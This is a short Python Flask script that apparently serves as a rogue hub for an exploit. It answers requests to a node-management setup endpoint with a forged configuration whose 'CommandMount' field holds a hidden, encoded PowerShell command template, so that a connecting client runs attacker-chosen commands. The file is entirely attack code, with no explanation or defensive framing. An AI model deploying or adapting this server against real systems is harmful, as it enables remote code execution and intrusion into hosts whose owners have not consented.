from flask import Flask, request, jsonify
import uuid

app = Flask(__name__)

PAYLOAD = "powershell -nop -w hidden -enc "

counter = 0

@app.route('/web/api/node-management/setup-initial-connection', methods=['POST'])
def hub():
    global counter
    counter += 1
    mount_path = f"C:\\Windows\\Temp\\mnt{counter}"
    cluster_id = str(uuid.uuid4())
    print(f"[+] Hit #{counter}! Sending with MountPath={mount_path}")
    response = {
        "ClusterID": cluster_id,
        "SharedSecret": str(uuid.uuid4()),
        "TargetHubs": {"a": "b"},
        "IsStandby": False,
        "SystemMount": {
            "Enabled": True,
            "ReadOnly": False,
            "MountPath": mount_path,
            "CommandMount": PAYLOAD,
            "UseArgumentsInCommand": False
        },
        "SystemAdminUsernames": ["admin"]
    }
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081)
